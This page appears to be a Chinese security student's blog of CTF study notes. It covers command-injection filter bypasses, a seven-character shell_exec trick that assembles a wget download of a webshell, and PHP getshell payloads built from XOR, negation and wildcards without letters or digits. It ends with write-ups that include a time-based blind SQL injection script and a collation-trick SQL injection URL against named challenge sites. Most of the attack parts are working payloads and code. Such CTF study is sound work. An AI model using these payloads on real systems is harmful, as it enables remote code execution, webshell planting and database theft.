<h3 id="命令符"><a href="#命令符" class="headerlink" title="命令符"></a>命令符</h3><p>这么说也不太贴切，主要是指`符号被过滤的情况下，具体作用在上一篇应该讲过。如果我们输入的命令被解析为字符串，那么使用这个符号就能让我们的命令被系统认为是命令来执行，所以在过滤了`这个情况下，我们如何使用其他的符号来使得我们的字符串被解析为命令呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$( 命令 )</span><br></pre></td></tr></table></figure></p>
<p>这个就可以成功让其解析。</p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>过滤的时候可能会通过过滤空格来阻止命令执行:<br><img src="/images/18/1.png" alt=""><br>通过测试可以看见当在过滤了空格之后cat命令是无法执行的，但是无伤大雅，图中可以看到我们可以通过几种方式来绕过:<br>&lt;<br>$IFS$9<br>${IFS}<br>$IFS在测试时发现，无法输出任何东西，主要原因是因为$IFS类似一个截断字符，具体原理也不详谈，总而言之就是将{}加入之后就能稳定的让命令执行。<br>还有一个在php环境下可以替代空格的字符%09，可以在php环境下进行测试。</p>
<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><p>命令分隔符简而言之就是链接两个命令的符号，在linux中最为常见的就是；，但是依旧有替代的符号可以在过滤了;的情况下进行命令分隔:<br><img src="/images/18/2.png" alt=""><br>可以看到最为基本的就是;进行分割，测试中发现|和&amp;只能起到执行后者命令的作用，看大手子的文章是说执行了但不回显，具体原理不去深究，在php环境下如下字符也是可以起到命令分隔的作用的:<br><img src="/images/18/3.png" alt=""></p>
<h3 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h3><p>顾名思义就是终止命令的符号，有%00，%20也就是#的编码。</p>
<h3 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h3><p>这一部分在上一篇文章详细写过了，这里主要再提一些Linux下的绕过操作:<br><img src="/images/18/4.png" alt=""><br>如上图所示，我列出了三种方法，第一种是通过构造几个变量，然后拼接而成；第二种和第一种类似，通过字符串的拼接来绕过关键词过滤；第三种则是编码绕过，最为常见的就是base64，在有其他环境的情况下还可以使用其他的编码，不过值得注意的是需要学会如何在linux下进行解码。</p>
<h2 id="七个字的命令执行"><a href="#七个字的命令执行" class="headerlink" title="七个字的命令执行"></a>七个字的命令执行</h2><p>这也是我参考了很多大牛写的有关命令执行的文章中所提到一个最开始研究这方向的原因，题目短小精简，代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>我一开始思路就是要么下一个shell，要么写入一个shell，但是发现这貌似有点行不通，例如当我们需要下载一个shell时，<strong>wget xxxx</strong>这里是肯定要超过8个字数限制的，然后写入shell这个思路怕是更加不行，我们写入的话必须用echo “xxx”&gt;1，除去xxx单单必要的函数加符号就有8个，所以两种方式都不行。<br>根据大手子的文章，发现了一个&gt;写入符号的特性，我们可以使用&gt;1来建立一个名为1的文件，但是没有echo的存在是无法写入任何内容的。继续跟着思路走，既然我们可以建立很多文件，那我们有没有可能把文件名一个一个总的写入一个新的文件呢？大手子提到的第二个操作就是<strong>ls&gt;a</strong>，ls列出所有的文件名然后写入a的新文件中：<br><img src="/images/18/5.png" alt=""><br>但是如图所示写入之后发现有几个问题：第一就是写入的内容是通过ASCII码来进行排序的，也就是说我们这样写必须得时刻注意文件名开头的ASCII码排序，如果在写入shell时要注意这个问题的话太过烦琐了，这个时候就可以用时间排序来进行排列，ls -t排序是把最先创建的文件排在最后：<br><img src="/images/18/6.png" alt=""><br>也就是说我们可以通过ls -t解决排序问题，接着就是没有办法写入&lt;?&gt;这几个符号，也就是说我们没办法写入shell，那只剩一条路了，就是通过写入wget a.cn来下载一个shell了：<br><img src="/images/18/7.png" alt=""><br>但是这时候出现了一个问题，就是我们输入的内容没办法有效的当成命令来执行，这里就需要用到\这个转义符来拼接命令了，在例如ec   ho时，我们可以通过转义换行符来拼接成echo这个命令，如下所示:<br><img src="/images/18/8.png" alt=""><br>可以看到我们通过用\转义符替代了;以及成功转义了换行符成功拼接了命令，echo成功输出了1，所以思路出来了，我们构造如下命令就可以写入shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;1.php</span><br><span class="line">&gt;-O\ \\</span><br><span class="line">&gt;cn\ \\</span><br><span class="line">&gt;\ a.\\</span><br><span class="line">&gt;wget\\</span><br></pre></td></tr></table></figure></p>
<p>参考文章：<br><a href="https://blog.csdn.net/qq_27446553/article/details/73927518" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a><br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="noopener">从七个字符长度的任意命令执行到GetShell</a><br><a href="https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/" target="_blank" rel="noopener"><br>HITCON2017-writeup整理</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjsk8gf1o001y5cvjyn7tmsz6" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-绕过过滤getshell的一些骚操作" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/27/绕过过滤getshell的一些骚操作/" class="article-date">
  <time class="post-time" datetime="2018-09-27T07:58:05.000Z" itemprop="datePublished">
    <span class="post-month">9月</span><br>
    <span class="post-day">27</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/27/绕过过滤getshell的一些骚操作/">绕过过滤getshell的一些骚操作</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近忙着一些社团的杂事，学习进度一度停滞不前….不知怎么见着其他人的技术越来越高，心中有了一丝无奈以及失望，不知道还能坚持多久下去，咸鱼总是停于安逸之处，强者总能一直前进不止。<br>借着安恒的题目归纳一下绕过限制getshell的几种策略。</p>
<h2 id="getshell前置内容"><a href="#getshell前置内容" class="headerlink" title="getshell前置内容"></a>getshell前置内容</h2><p>在之前的文章讲过了getshell的一些基本内容，重复内容就不讲解了。一般我们通过一些函数来传入命令参数，再通过解析将命令执行最终输出我们想要的结果，具体说一下这些函数的特点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert():检查一个断言是否为 FALSE，如果是 FALSE 则返回 FALSE，否则是 TRUE。但是这并不是它被利用的原因，在传入一个字符串后，这个字符串会被当做PHP代码来执行，比如我们常用的phpinfo()，file_put_content()等等都能执行。值得注意的是这里不仅仅可以传入字符串，也能传入函数。</span><br><span class="line">eval():把字符串按照 PHP 代码来计算，和上者类似，但是eval()只能传入字符串。</span><br><span class="line">system():执行外部程序，并且显示输出。执行命令把结果返回。  </span><br><span class="line">exec():执行命令，如果带有参数，会将结果返回。</span><br></pre></td></tr></table></figure></p>
<p>然后就是要认识一些基础的linux或者windows下的命令了，具体可以自行百度，后续用到的命令也会粗略提及。  </p>
<h2 id="函数被过滤"><a href="#函数被过滤" class="headerlink" title="函数被过滤"></a>函数被过滤</h2><p>一般来说，网站会通过过滤shell里常用的一些函数来防止被攻击，常见的过滤手段如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$iarok[] = str_ireplace(array(&apos;unlink&apos;,&apos;opendir&apos;,&apos;mysqli_&apos;,&apos;mysql_&apos;,&apos;socket_&apos;,&apos;curl_&apos;,&apos;base64_&apos;,&apos;putenv&apos;,&apos;popen(&apos;,&apos;phpinfo&apos;,&apos;pfsockopen&apos;,&apos;proc_&apos;,&apos;preg_&apos;,&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;,&apos;_REQUEST&apos;,&apos;_SESSION&apos;,&apos;_SERVER&apos;,&apos;assert&apos;,&apos;eval(&apos;,&apos;file_&apos;,&apos;passthru(&apos;,&apos;exec(&apos;,&apos;system(&apos;,&apos;shell_&apos;), &apos;@.@&apos;, $v);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>通过将命令执行函数或者一些危险的存在利用点的函数全部用无效符号替换。这种过滤的绕过方式有大致几种，第一种就是通过字符串拼接来绕过，其余可以通过大小写绕过，或者双写绕过，这里的方式可以参考之前XSS过滤的方式。  </p>
<h3 id="参考示例"><a href="#参考示例" class="headerlink" title="参考示例"></a>参考示例</h3><p>最近接触到的应该是安恒杯9月web1，web1通过利用之前seacms爆出的漏洞而改的，具体示例可以参考seacms最新后台getshell的文章:<a href="https://www.anquanke.com/post/id/153402。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153402。</a><br>在过滤了_GET，_POST以及cookie传参的途径下，通过字符拼接成功构造了payload。参考如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[&quot;_G&quot;.&quot;ET&quot;][$a]($GLOBALS[&quot;_G&quot;.&quot;ET&quot;][$b]);</span><br></pre></td></tr></table></figure></p>
<p>我们传入a=system&amp;b=ls，就形成了system(“ls”);，ls命令成功执行最后返回结果。  </p>
<h2 id="数字和字母被过滤"><a href="#数字和字母被过滤" class="headerlink" title="数字和字母被过滤"></a>数字和字母被过滤</h2><p>这个比上面那个过滤稍微狠一点，拼接字符串是不太可能实现了，具体过滤实现代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123;</span><br><span class="line">  eval($_GET[&apos;shell&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>虽然过滤了数字和字符，但是这并不意味着就没办法构造出字符和数字了，异或以及反取符号都在的情况下，可以通过不可见字符转换为字母，比如以下的几个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos; = &apos;=&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;e&apos; = &apos;@&apos; ^ &apos;%&apos;</span><br><span class="line">&apos;r&apos; = &apos;.&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;t&apos; = &apos;(&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;s&apos; = &apos;/&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;m&apos; = &apos;-&apos; ^ &apos;@&apos;</span><br><span class="line">&apos;y&apos; = &apos;&amp;&apos; ^ &apos;_&apos;</span><br><span class="line">&apos;E&apos; = &apos;&gt;&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;G&apos; = &apos;&lt;&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;O&apos; = &apos;/&apos; ^ &apos;`&apos;</span><br><span class="line">&apos;P&apos; = &apos;+&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;S&apos; = &apos;(&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;T&apos; = &apos;/&apos; ^ &apos;&#123;&apos;</span><br></pre></td></tr></table></figure></p>
<p>这些是我测试出来可以构造payload的操作，可以直接拿来用。例如构造以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;_&quot;.(&apos;&lt;&apos; ^ &apos;&#123;&apos;).(&apos;&gt;&apos; ^ &apos;&#123;&apos;).(&apos;/&apos; ^ &apos;&#123;&apos;);  //$_=&quot;_GET&quot;</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);  //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=(&apos;/&apos; ^ &apos;\\&apos;).(&apos;&amp;&apos; ^ &apos;_&apos;).(&apos;/&apos; ^ &apos;\\&apos;).(&apos;(&apos; ^ &apos;\\&apos;).(&apos;@&apos; ^ &apos;%&apos;).(&apos;-&apos; ^ &apos;@&apos;)  //system($_GET[__])</span><br></pre></td></tr></table></figure></p>
<p>接着传入命令就行了。<br><strong>值得注意的是，不仅仅可以用其他可见字符，不可见字符经过url编码进行异或也是可以实现的。</strong></p>
<h3 id="取反-参考了p神的文章"><a href="#取反-参考了p神的文章" class="headerlink" title="取反(参考了p神的文章)"></a>取反(参考了p神的文章)</h3><p>和上一种方法类似的是取反，例如\x9e取反之后就成了a，各个字符如何通过取反得到可以去测试一下，如下是构造的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;~&quot;\xA0\xB8\xBA\xAB&quot;&#125;[_]($&#123;~&quot;\xA0\xB8\xBA\xAB&quot;&#125;[__]); //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=&#123;~&quot;\x8c\x86\x8c\x8b\x9a\x92&#125;  //system</span><br><span class="line">&amp;__=&#123;~&quot;\x93\x8c&quot;&#125; //ls</span><br></pre></td></tr></table></figure></p>
<p>此外可以参考p神写的这个payload,他利用了utf8汉字编码提取出类似的编码进行取反:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure></p>
<p><strong>还有一种也是p神想出来的方法，具体操作可以参考他的这篇文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></strong></p>
<h3 id="参考示例-1"><a href="#参考示例-1" class="headerlink" title="参考示例"></a>参考示例</h3><p>这是一道代码审计的题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint = &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>让我们不使用字母以及数字来执行getFlag()这个函数，这里就可以参考上面的payload来进行绕过了，payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot; ^ &quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure></p>
<p><strong>PS:`代表执行命令，?匹配字符，所以形成_GET字符</strong></p>
<h2 id="数字，字母，-以及-被过滤"><a href="#数字，字母，-以及-被过滤" class="headerlink" title="数字，字母，$以及_被过滤"></a>数字，字母，$以及_被过滤</h2><p>这个就比上一个再更加狠一点了，因为我们所要的$被过滤了，也就是说我们无法构造变量了，这里用到了一个很冷门的知识:<strong>?&gt;&lt;?=是可以直接输出后面的代码的</strong>(具体原理参考大师傅们的解释)，以及?是通配符这个知识。例如我们使用/???/???可以匹配/bin/cat这个命令。</p>
<h3 id="参考示例-2"><a href="#参考示例-2" class="headerlink" title="参考示例"></a>参考示例</h3><p>这是安恒杯web2的一部分题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>再通过操作得出有/flag的前提下，我们可以使用上面的知识，生成以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`/???/??? /????`;?&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="字符长度限制"><a href="#字符长度限制" class="headerlink" title="字符长度限制"></a>字符长度限制</h2><p>这就要结合某次丧心病狂的比赛了，里面都是命令执行，这部分在后续会详细写出来……..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjsk8gf1l001u5cvjgpb3tox7" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-solve-me-后续" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/16/solve-me-后续/" class="article-date">
  <time class="post-time" datetime="2018-08-16T04:21:27.000Z" itemprop="datePublished">
    <span class="post-month">8月</span><br>
    <span class="post-day">16</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/16/solve-me-后续/">solve me 后续</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h2><p><img src="/images/17/24.png" alt=""><br>题目和之前的一题一样，是一道注入题。分析题目大致流程是这样：<br>当我们输入answer时，首先判断数据库是否有表，如果没有的话就会创建一个新的表，有的话会从表中进行语句的查询。如果count等于12，那么就会销毁表中的数据。接着判断语句查询回显是否为answer，如果不为，那么count数+1。<br>大致流程是这样，不过有个很明显的缺陷就是<strong>count === 12</strong>一般来说这里完全可以使用&gt;= 12来阻止盲注，这里却是使用===来进行阻止。这里就可以卡着11这个节点让count连续加上两次。<strong>我们在连续访问第十一次之后，创建一个sleep(50)的请求，再快速访问一次，快速访问过后count为12，但是之前sleep(50)已经过了count的比较，等sleep(50)回应过后，count就变成了13，接着就能无限次的时间盲注访问了。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">header = &#123;&#125;#这里是你绕过12次后的header值</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    for j in &quot;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;_&quot;:</span><br><span class="line">        url = &quot;http://iamslowly.thinkout.rf.gd/?answer=&apos; or case when(answer like &apos;%s%%&apos;) sleep(30) else sleep(0) end --+&quot;%(flag+j)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url,headers=header,timeout=29)</span><br><span class="line">            print &quot;i:&quot;,i,&quot;j:&quot;,j,r.content[:10]</span><br><span class="line">        except:</span><br><span class="line">            flag += j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<h2 id="Cheap-lottery"><a href="#Cheap-lottery" class="headerlink" title="Cheap lottery"></a>Cheap lottery</h2><p>这是一道很好的题目，相比之下我宁愿做一道难题也不愿做十道简单的题目，而且最近有些浮躁，一些基础原理回过头没能理会真正的意思。<br>打开题目是一个购买类似彩票的网站，然后题目要求我们通过购买五个数字，全部正确才能得到flag，按照常理来说，这种概率是很小很小的，所以肯定有其他的方式来获得flag。<br>一如既往的先去robots.txt看看，发现有个backup，里面有一个sql文件，给我们提示了lottery表的构造，然后就是源码了，废话不多说开始审计，主要梳理一下流程。<br><img src="/images/17/28.png" alt=""><br>这里值得注意的是name的参数是通过guest_加上我们ip地址，这是为了识别我们购买彩票的用户，而且限定了一个IP只能购买一次彩票，有效的阻止了通过爆破来获取flag。然后判断我们是否选择了五个数字，未选满则会让我们选满五个才能进入下一步的操作。<br><img src="/images/17/29.png" alt=""><br>在通过判断一分钟之内我们没买过彩票之后进入这个语句，服务器通过识别用户ip，创建一个名为admin_ip的用户数据，把自己随机生成的五个数一同插入数据库，接着从url中把字母，=，以及[]全部过滤为空，然后把&amp;所连接的几个参数转变为数组的形式。<br><img src="/images/17/30.png" alt=""><br>通过判断间隔时间是否超过一分钟，如果未超时，那么开始从数据库中查找guest_ip以及admin_ip的数据，比对两者的数字是否一致，只有两者五个数字完全一致才能得到flag。<br>整体看了看流程，能出现的漏洞只有可能是注入以及逻辑漏洞，但是分析流程发现逻辑漏洞存在的可能并不高，数据对接找不到可以利用的点，所以只能是sql注入了，而且在backup中还提示了lottery表的基本构造，所以可以敲定是sql注入，可是注入点在哪里呢？在传参的过程中只有一个是用户可控输入的，那就是lottery，也只能从这里下手，但是服务器在处理参数的时候把字母处理掉了，也就是说在构造guest_ip是不太可能实现的，这该怎么办呢？  </p>
<p>利用数据库的字符集转换！！！！！！！！<br>参考了大师傅的分析文章，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results。</span><br></pre></td></tr></table></figure></p>
<p>这题目的转换就是从utf8-&gt;utf8-&gt;utf8，但是发现好像并没有什么作用，在utf8中我们找不到能替代字母的字符，那也只能继续找能代替字母的字符，参考了离别歌师傅的文章，找到了关键的突破口：<strong>utf8和默认collation字符顺序下不同编码字符被认为相等的特性</strong>，也就是说我们可以使用à来替代a。在mysql的官方文档中说明了这一点：<br><img src="/images/17/31.png" alt=""><br>接着梳理character set与collation的关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql 有两个支持 unicode 的 character set:  </span><br><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。  </span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure></p>
<p>接着本地测试:<br><img src="/images/17/32.png" alt=""><br>发现collation默认的是utf8_general_ci，在此规则下大小写是不敏感的，所以也可以解释为什么<strong>admin=AdMin</strong>，继续深入。<br>unicode比对字符串默认顺序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.alphabetic ordering</span><br><span class="line">2.diacritic ordering</span><br><span class="line">3.case ordering.</span><br></pre></td></tr></table></figure></p>
<p>在2的变音排序时，导致了上述的*A 和 Â 是一个字母。所以到此为止，结合以上的几个原理，有大师傅通过这些原理测试出了一张比对表，参考如下：<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>根据比对的结果可以得出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:%C3%A1%C4%8F%E1%B8%BF%C3%AD%C5%84</span><br><span class="line">guest:%C4%9F%C3%BA%C3%A9%C5%9B%C5%A5</span><br></pre></td></tr></table></figure></p>
<p>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = &quot;149.28.21.208&quot;;</span><br><span class="line">$time = time();</span><br><span class="line">$url = &quot;http://cheaplottery.solveme.peng.kr/index.php?lottery[A]=1&apos;),(&apos;%C3%A1%C4%8F%E1%B8%BF%C3%AD%C5%84_$ip&apos;,&apos;$time&apos;,&apos;1,2,3,4,5&apos;),(&apos;%C4%9F%C3%BA%C3%A9%C5%9B%C5%A5_$ip&apos;,&apos;$time&apos;,&apos;1,2,3,4,5&apos;)%23&amp;lottery[B]=&amp;lottery[C]=&amp;lottery[D]=&amp;lottery[E]=&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着在服务器curl一下 <a href="http://cheaplottery.solveme.peng.kr/index.php" target="_blank" rel="noopener">http://cheaplottery.solveme.peng.kr/index.php</a> 就行了。</p>
